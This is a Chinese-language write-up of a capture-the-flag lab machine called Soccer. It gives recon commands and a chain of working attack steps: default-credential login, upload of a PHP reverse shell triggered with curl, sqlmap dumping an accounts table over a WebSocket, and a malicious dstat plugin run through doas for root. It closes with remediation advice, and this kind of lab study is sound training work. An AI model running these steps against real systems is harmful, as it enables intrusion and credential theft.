## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Soccer
2. 難度:Easy
3. IP:10.129.6.141

### 主要發現：
1. 漏洞 ：透過預設密碼和舊版本的檔案上傳功能存在的路徑遍歷漏洞實現遠端程式碼運行（風險等級：High）
2. 漏洞 ：透過基於布林值的SQL盲注列舉資料庫內容實現憑證洩漏（風險等級：High）
3. 漏洞 ：利用未設密碼卻擁有SUID權限的doas透過Python程式碼注入dstat實現權限提升（風險等級：High）

### 攻擊鏈摘要：

透過目錄爆破了解/tiny的登入頁面後，使用預設憑證成功進入檔案上傳頁面，上傳惡意腳本後利用舊版本存在的路徑遍歷漏洞呼叫惡意腳本，獲得系統存取權限，造成內部文件洩漏。洩漏的內部文件可見隱藏的使用者頁面，在其中存在基於布林值的SQL盲注，可列舉資料庫的資料，造成重大憑證洩漏。利用洩漏的憑證登入SSH連線，透過擁有SUID權限的doas呼叫dstat，並使用惡意參數，可實現直達root的權限提升。

### 潛在影響：

1. 舊版本的檔案上傳功能存在的路徑遍歷漏洞可讓攻擊者獲得系統存取權限，造成內部文件洩漏。
2. 基於布林值的SQL盲注，可列舉資料庫的資料，造成重大憑證洩漏。
3. dstat具有外掛程式(Plugin)載入功能，攻擊者可以輕易繞過指令限制，將「受限的指令執行」轉化為「完全的 Root 權限」。

### 修復建議：

1. 立即更改網站的預設憑證。
2. 立刻將網站的上傳頁面更新至最新版本，並設置白名單限制上傳種類。
3. 限制使用者輸入，使用白名單過濾掉特殊符號，避免SQL注入。
4. 針對一般使用者對dstat的外掛程式實施讀寫限制，避免惡意外掛注入。
5. doas設置密碼限制。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.6.141
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.6.141
sudo nmap --script=vuln -p22,80 10.129.6.141
```
<img width="712" height="237" alt="螢幕擷取畫面 2026-02-24 210017" src="https://github.com/user-attachments/assets/c767bdc8-7362-4d44-a79b-f7a6e43ae804" />
<img width="1109" height="493" alt="螢幕擷取畫面 2026-02-24 210031" src="https://github.com/user-attachments/assets/72d462a0-babb-4944-aade-8726aa1459f7" />
<img width="739" height="228" alt="螢幕擷取畫面 2026-02-24 210940" src="https://github.com/user-attachments/assets/b172ad4d-0c0c-4c4f-9b06-96393e409cdc" />

將URL寫入/etc/hosts

<img width="507" height="226" alt="螢幕擷取畫面 2026-02-24 210206" src="https://github.com/user-attachments/assets/21888d45-4676-4c8e-9b08-faa48c52bb92" />

探索80主頁

<img width="1553" height="818" alt="螢幕擷取畫面 2026-02-24 210354" src="https://github.com/user-attachments/assets/95c1c6b2-f0b6-43f2-895a-760ebd89df21" />


### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://soccer.htb -w /usr/share/dirbuster/wordlists/directory-2.3-medium.txt
```
<img width="1279" height="347" alt="螢幕擷取畫面 2026-02-24 211121" src="https://github.com/user-attachments/assets/be2e5ecf-5140-4951-9825-04fc5d2a373d" />
<img width="884" height="717" alt="螢幕擷取畫面 2026-02-24 211131" src="https://github.com/user-attachments/assets/6ea268a1-b919-45a7-a576-f844d561b043" />


### 2.3 初始存取(Initial Access)

透過Google搜尋預設憑證，成功登入

<img width="817" height="732" alt="螢幕擷取畫面 2026-02-24 211636" src="https://github.com/user-attachments/assets/c96ff954-d9f4-4e4b-a114-8b34d46d5473" />
<img width="1885" height="741" alt="螢幕擷取畫面 2026-02-24 211716" src="https://github.com/user-attachments/assets/d7d35289-c766-4f4f-ac4b-bbc56a06cbdf" />

Google了解到該版本存在路徑遍歷漏洞

<img width="757" height="743" alt="螢幕擷取畫面 2026-02-24 211840" src="https://github.com/user-attachments/assets/6c93ce6b-9157-46a2-963f-13cf794e7ec1" />

嘗試上傳惡意腳本，卻被告知目錄沒有寫入權限

<img width="1878" height="484" alt="螢幕擷取畫面 2026-02-24 211949" src="https://github.com/user-attachments/assets/e91ccc76-578d-41fa-968c-ddd91746cdd1" />
<img width="460" height="172" alt="螢幕擷取畫面 2026-02-24 212045" src="https://github.com/user-attachments/assets/eacae913-d058-4445-975b-acd2ef60fca0" />

將目錄移動到uploads後上傳惡意腳本，成功上傳

<img width="1803" height="255" alt="螢幕擷取畫面 2026-02-24 212710" src="https://github.com/user-attachments/assets/c55ace90-c2ef-4524-87ad-139105fc1c09" />
<img width="1881" height="240" alt="螢幕擷取畫面 2026-02-24 212726" src="https://github.com/user-attachments/assets/9e1f7541-3942-4abb-a5e6-d65cf72a8437" />
<img width="1883" height="411" alt="螢幕擷取畫面 2026-02-24 212752" src="https://github.com/user-attachments/assets/26ec086b-4508-4520-a607-3d2e4931b0cd" />

建立nc監聽
```bash
nc -lvnp 1234
```
<img width="525" height="152" alt="螢幕擷取畫面 2026-02-24 212958" src="https://github.com/user-attachments/assets/5d7b5fe8-5f94-4e88-9b14-e5af66efac66" />

使用curl呼叫惡意腳本，獲得反彈shell
```bash
curl http://soccer.htb/tiny/uploads/php-reverse-shell.php
```
<img width="626" height="119" alt="螢幕擷取畫面 2026-02-24 213209" src="https://github.com/user-attachments/assets/7f3b52f0-bbe5-4532-aca6-0c2d66203078" />
<img width="931" height="351" alt="螢幕擷取畫面 2026-02-24 213225" src="https://github.com/user-attachments/assets/0f2f5d2e-d177-4eaf-b2cc-a4ed9d0f3807" />

### 2.4 橫向移動(Lateral Movement)

低權限帳號無法取得flag，在系統內搜索，在nginx設定檔中找到隱藏網址

<img width="756" height="362" alt="螢幕擷取畫面 2026-02-24 220143" src="https://github.com/user-attachments/assets/75b6feb0-d970-4fda-9a49-d53564e0e29e" />

寫入/etc/hosts

<img width="495" height="196" alt="螢幕擷取畫面 2026-02-24 220534" src="https://github.com/user-attachments/assets/94df26a8-600c-4698-b5ce-e46c851d846a" />
<img width="1752" height="663" alt="螢幕擷取畫面 2026-02-24 220612" src="https://github.com/user-attachments/assets/beb37a82-597a-472f-a2ab-ea334ca67e28" />

建立帳號後登入

<img width="1516" height="826" alt="螢幕擷取畫面 2026-02-24 220920" src="https://github.com/user-attachments/assets/72d82b7b-90e8-496a-aad3-3847d9ed7e4e" />
<img width="1255" height="646" alt="螢幕擷取畫面 2026-02-24 220947" src="https://github.com/user-attachments/assets/5a86a8d4-2c33-4f70-bf9d-316bd079ec25" />

測試面板回應，使用基於布林值的SQLi PoC測試，確認漏洞存在

<img width="561" height="329" alt="螢幕擷取畫面 2026-02-24 221505" src="https://github.com/user-attachments/assets/2587b05b-044b-4f36-9a2c-085dc0c921c7" />
<img width="567" height="335" alt="螢幕擷取畫面 2026-02-24 221516" src="https://github.com/user-attachments/assets/768f7109-3d13-483a-a5b0-85988e0a2d2d" />
<img width="600" height="362" alt="螢幕擷取畫面 2026-02-24 221604" src="https://github.com/user-attachments/assets/71bd8445-1afc-41f7-aa0d-d6c233648d7b" />

在原始碼確認細節，確認網站利用WebSocket和搜尋語句

<img width="664" height="271" alt="螢幕擷取畫面 2026-02-24 222154" src="https://github.com/user-attachments/assets/4041c032-9464-44a1-9450-242c55308641" />
<img width="477" height="389" alt="螢幕擷取畫面 2026-02-24 222257" src="https://github.com/user-attachments/assets/52874c81-be18-4fff-8e82-c63305136c4e" />

使用sqlmap枚舉資料庫
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbms 'mysql' --dbs --batch --threads 10
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbms 'mysql' -D 'soccer_db' --batch --threads 10
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbms 'mysql' -D 'soccer_db' -T 'accounts' --dump --batch --threads 10
```

<img width="1255" height="269" alt="螢幕擷取畫面 2026-02-24 223039" src="https://github.com/user-attachments/assets/b95aba5a-4cd2-464e-bf49-7857f6a9df8f" />
<img width="1317" height="197" alt="螢幕擷取畫面 2026-02-24 224232" src="https://github.com/user-attachments/assets/9f2d9490-eb90-4e51-be2f-261e1dac6b6b" />

用取得的憑證登入SSH

<img width="722" height="725" alt="螢幕擷取畫面 2026-02-24 224849" src="https://github.com/user-attachments/assets/34c9c6ff-328c-4626-9d90-fedb252224a7" />
<img width="529" height="99" alt="螢幕擷取畫面 2026-02-24 224920" src="https://github.com/user-attachments/assets/f769deb5-e2b6-4868-8140-07b20988151b" />

### 2.5 權限提升(Privilege Escalation)

列舉SUID權限
```bash
find / -perm -u=s -type f 2>/dev/null
```
<img width="589" height="574" alt="螢幕擷取畫面 2026-02-24 225106" src="https://github.com/user-attachments/assets/f77d087a-b2c1-4b9a-8702-96370f1ba301" />

列舉doas設定檔
```bash
find / -name doas.conf 2>/dev/null
cat /usr/local/etc/doas.conf
```

<img width="499" height="87" alt="螢幕擷取畫面 2026-02-24 225207" src="https://github.com/user-attachments/assets/327ed98d-0b90-44c3-910f-dcec20c76014" />

因為我不熟dstat，我去手冊頁裡了解一下，得知外掛檔的命名方式和路徑

<img width="622" height="248" alt="螢幕擷取畫面 2026-02-24 225451" src="https://github.com/user-attachments/assets/f6e80da5-2885-4fd1-8b8a-e2d3df51ae22" />

建立惡意外掛檔
```bash
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_payload.py
```
<img width="955" height="55" alt="螢幕擷取畫面 2026-02-24 225741" src="https://github.com/user-attachments/assets/5271387f-95b4-4edd-afa7-accf25bdb58a" />

執行惡意外掛檔，獲得root權限
```bash
doas /usr/bin/dstat --payload
```

<img width="1330" height="109" alt="螢幕擷取畫面 2026-02-24 225830" src="https://github.com/user-attachments/assets/a0d97966-7896-4ba6-9a34-b9653b9e95d5" />

### 2.6 最終成果(Impact)

獲得root權限

<img width="985" height="215" alt="螢幕擷取畫面 2026-02-24 230012" src="https://github.com/user-attachments/assets/5440f7ab-ccad-45f0-a040-d9325582d42e" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
